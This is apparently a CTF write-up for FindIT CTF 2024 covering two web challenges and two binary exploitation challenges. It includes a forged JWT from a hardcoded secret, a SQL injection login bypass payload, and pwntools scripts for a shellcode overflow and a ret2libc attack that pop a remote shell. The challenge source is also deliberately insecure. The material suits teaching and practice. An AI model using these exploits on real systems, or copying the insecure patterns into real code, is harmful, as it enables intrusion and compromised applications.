# FinditCTF 2024

Tags: national
Status: Not started

# Find IT CTF 2024

- Tags: national
- Status: Not started
- pwned: 4

# Web

## kue

### Description

Aku baru saja membuat website yang menggunakan cookies berbasis JWT menggunakan chatgpt, tapi ada yang salah sepertinya ketika mengenkripsi JWT-nya.

### Solution

We're give a source code so its a whitebox challenge, lets start by checking app.js.

```jsx
const jwt = require("jsonwebtoken");
const express = require("express");
const cookieParser = require("cookie-parser");
const fs = require("fs");

const app = express();
app.use(cookieParser());

const JWT_SECRET = "your_secret_key";

const verifyJWT = (req, res, next) => {
    const token = req.cookies.auth;
    jwt.verify(token, JWT_SECRET, (err, decoded) => {
        if (err) return res.sendStatus(403);
        if (!decoded.roles) return res.sendStatus(403);
        req.roles = decoded.roles;
        next();
    });
};

app.get("/", (req, res) => {
    // Check if the client sent a cookie named 'auth'
    if (req.cookies.auth) {
        try {
            const decoded = jwt.verify(req.cookies.auth, JWT_SECRET);
            res.send(
                `Welcome back! Your username is ${decoded.username} and your roles are ${decoded.roles}`
            );
        } catch (error) {
            res.send("Invalid token. Please refresh to get a new token.");
        }
    } else {
        // User visits for the first time, set a JWT cookie
        const token = jwt.sign(
            { username: "new_user", roles: "user" },
            JWT_SECRET,
            {
                expiresIn: "1d",
            }
        );
        res.cookie("auth", token, {
            httpOnly: true, // Cookie accessible only by web server
            maxAge: 86400000, // Cookie expires after 1 day
        });
        res.send(
            "Hello, first time visitor! We have set a secure cookie for you."
        );
    }
});

app.get("/flag", verifyJWT, (req, res) => {
    try {
        if (req.roles !== "admin") return res.sendStatus(403);
        res.send(fs.readFileSync("flag.txt", "utf8"));
    } catch (error) {
        res.sendStatus(403);
    }
});

// Start the server on port 6060
app.listen(6060, () => {
    console.log("Server is running on http://localhost:6060");
});
```

it is very straightfoward because i realize the app stored an jwt_secret that unsecured in the application so we can directly craft an cookie and access the admin panel. Using [jwt.io](http://jwt.io) we can modify the cookie to access admin panel and flag path.

![Untitled](FinditCTF%202024%20f1afe1fa67b14654b02a96d46a2eac51/Untitled.png)

### Flag

`FindITCTF{k0p1_k4p4l_134bi}`

## login dulu

### Description

Just read the file!

### Solution

This is also a whitebox we’re give a source code lets read important parts app.js

```jsx
const express = require("express");
const session = require("express-session");
const sqlite3 = require("sqlite3").verbose();
const bodyParser = require("body-parser");
const crypto = require("crypto");
var fs = require("fs");
const path = require("path");

const app = express();
const port = 7070;

const db = new sqlite3.Database(":memory:");

db.serialize(() => {
    db.run(
        "CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT)"
    );
});

app.use(
    session({
        secret: crypto.randomBytes(16).toString("base64"),
        resave: false,
        saveUninitialized: true,
    })
);

app.set("views", path.join(__dirname, "views"));
app.set("view engine", "ejs");
app.use(express.static("static"));
app.use(bodyParser.urlencoded({ extended: true }));

app.get("/", (req, res) => {
    const loggedIn = req.session.loggedIn;
    const username = req.session.username;

    res.render("index", { loggedIn, username });
});

app.get("/login", (req, res) => {
    res.render("login");
});

app.post("/login", (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    db.get(
        'SELECT * FROM users WHERE username = "' +
            username +
            '" and password = "' +
            password +
            '"',
        (err, row) => {
            if (err) {
                console.error(err);
                res.status(500).send("Error retrieving user");
            } else {
                if (row) {
                    req.session.loggedIn = true;
                    req.session.username = username;
                    res.send("Login successful!");
                } else {
                    res.status(401).send("Invalid username atau password");
                }
            }
        }
    );
});

app.get("/logout", (req, res) => {
    req.session.destroy();
    res.send("Logout successful!");
});

app.get("/flag", (req, res) => {
    if (req.session.username == "admin") {
        res.send(
            "Selamat datang admin. Flagnya adalah " + fs.readFileSync("flag.txt", "utf8")
        );
    } else if (req.session.loggedIn) {
        res.status(401).send("Kamu harus menjadi Admin untuk mendapatkan Flag.");
    } else {
        res.status(401).send("Unauthorized. Login terlebih dahulu.");
    }
});

app.listen(port, () => {
    console.log(`App listening at http://localhost:${port}`);
});

```

i could easily know that the query is not sanitize so its definitely an sql injection, after some trying i notice when attempting an union query we get “error retrieving user”. So union maybe can works, and the final payload looks like this:

`username=admin&password=" union select NULL,NULL,NULL --` 

Then after that just go to flag page

### Flag

`FindITCTF{manc1n9_m4n14K}`

# PWN

## Elevator

### Description

Use the elevator and convince everyone you are the admin.

### Solution

We’re given the binary, to make it easier im using dogbolt to decompile it:

![Untitled](FinditCTF%202024%20f1afe1fa67b14654b02a96d46a2eac51/Untitled%201.png)

Also using checksec very straightforward there is no protection for shellcode, so we can inject shellcode after buffer overflow i notice the buffer is 1032 and + 4 to close ebp so it will be 1036, here is my shellcode script:

```jsx
from pwn import *

HOST = "103.191.63.187"
PORT = "5000"
r = remote(HOST, PORT)
r.recvuntil(b'How are you?: \n\n')

context.binary = ELF('./admin')

# p = process()
offset = 1036
payload = b''
payload += offset*b'A'
payload += p32(0x08049199)
payload += asm(shellcraft.sh())
print(payload)
log.info(r.clean())

r.sendline(payload)
r.interactive()
```

![Untitled](FinditCTF%202024%20f1afe1fa67b14654b02a96d46a2eac51/Untitled%202.png)

### Flag

`FindITCTF{m4m4h_4ku_h3k3r_l33t}`

## **Everything Machine 2.0**

### Description

The "Everything Machine" is a volumetric printer that has the ability to copy and print any three dimensional object. The maintainer of the Everything Machine has received your feedback from last year and are proud to deploy the second model. But I think you can still force it to print a flag though.

### Solution

In the zip file given, there are binary also with libc files. Unfortunately i sugest it will be something related with ret2libc after some time learning something new i found interesting writeup [https://ctftime.org/writeup/14404](https://ctftime.org/writeup/14404)  looks the same with my condition because i need to find the libc-base address first and it needs some adress that can be find from libc file, following the writeup ive come to successfull script, Here is my script to perform ret2libc:

```
import struct
import socket
from pwn import *

context(arch = 'i386', os = 'linux', endian = 'little')

puts_plt = 0x08049070
puts_got = 0x804c018       #objdump -R everything4 | grep puts
main = 0x080491eb              #objdump -D everything4 | grep main

buf = b""
buf += b"A"*2036             
buf += p32(puts_plt)         
buf += p32(main)             
buf += p32(puts_got)         

# s = process("everything4")
s = remote('103.191.63.187', 5001)
log.info("Stage 1: ...Leaking Memory")
s.recvuntil("Step forward for synchronization:\n\n")
s.sendline(buf)
received = s.recvline()
print(received)
leaked_puts_got = received.strip()
leaked_puts_got = u32(leaked_puts_got)
addrs = hex(leaked_puts_got)
leaked_puts_got = int(addrs, 16)
log.success("Leaked remote libc address: " + addrs)
print('')

#################### STAGE2 ####################

libc = ELF("libc.so.6")

libc_base = leaked_puts_got - libc.sym.puts
system_addr = libc_base + libc.sym["system"]
fake_addr = 0xbeefdead
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))

buf = b""
buf += b"A"*2036      
buf += p32(system_addr)
buf += p32(fake_addr)     
buf += p32(bin_sh_addr)

log.info("Stage 2: ...Obtaining Shell ")
s.sendline(buf)
s.interactive()
```

![Untitled](FinditCTF%202024%20f1afe1fa67b14654b02a96d46a2eac51/Untitled%203.png)

### Flag

`FindITCTF{Pl3as3_3x!t_th3_pl4tf0rm}`